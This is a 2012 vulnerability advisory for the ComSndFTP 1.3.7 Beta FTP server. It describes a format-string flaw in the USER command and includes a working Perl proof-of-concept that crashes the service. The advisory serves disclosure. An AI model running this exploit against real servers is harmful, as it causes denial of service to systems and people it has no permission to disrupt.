Title: ComSndFTP Server Remote Format String Overflow Vulnerability
Software : ComSndFTP FTP Server

Software Version : ComSndFTP 1.3.7 Beta

Vendor: http://ftp.comsnd.com/

Vulnerability Published : 2012-06-07

Vulnerability Update Time :

Status :

Impact : Medium(CVSS2 Base : 5.0, AV:N/AC:L/Au:N/C:N/I:N/A:P)

Bug Description :
ComSndFTP Server is a free ftp server for windows.
It is possible for remote attackers to use USER command with any format string that will lead to a Denial Of Service flaw for the FTP service.

Proof Of Concept :
-----------------------------------------------------------
#!/usr/bin/perl -w
#ComSndFTP Server Remote Format String Overflow Exploit
#Written by demonalex (at) 163 (dot) com [email concealed]
use IO::Socket;
$|=1;
$host=shift || die "$0 \$host \$port\n";
$port=shift || die "$0 \$host \$port\n";
$evil = '%s%p%x%d';
print "Launch Attack ... ";
$sock1=IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>'tcp', Timeout=>30) || die "HOST $host PORT $port is down!\n";
if(defined($sock1)){
$sock1->recv($content, 100, 0);
sleep(2);
$sock1->send("USER ".$evil."\r\n", 0);
sleep(2);
$sock1->recv($content, 100, 0);
sleep(5);
$sock1->close;
}
print "Finish!\n";
exit(1);
-----------------------------------------------------------

Credits : This vulnerability was discovered by demonalex(at)163(dot)com
mail: demonalex(at)163(dot)com / ChaoYi.Huang (at) connect.polyu (dot) hk [email concealed]
Pentester/Independent Researcher
Dark2S Security Team/HongKong PolyU